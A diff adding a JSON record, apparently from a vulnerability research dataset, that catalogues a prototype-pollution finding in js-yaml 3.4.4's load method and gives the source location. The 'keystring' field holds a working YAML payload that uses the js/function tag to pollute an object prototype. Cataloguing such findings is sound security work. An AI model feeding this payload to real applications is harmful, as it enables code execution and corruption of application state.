@@ -1,0 +1,8 @@
+{
+  "id": "",
+  "upstream": "js-yaml@3.4.4",
+  "keymethod": "load",
+  "keystring": "{ toString: !<tag:yaml.org,2002:js/function> 'function (){return (this.constructor.prototype.polluted=`yes`)}' } : 1",
+  "location": "lib/js-yaml/type/js/function.js:70:12",
+  "downstreams": []
+}
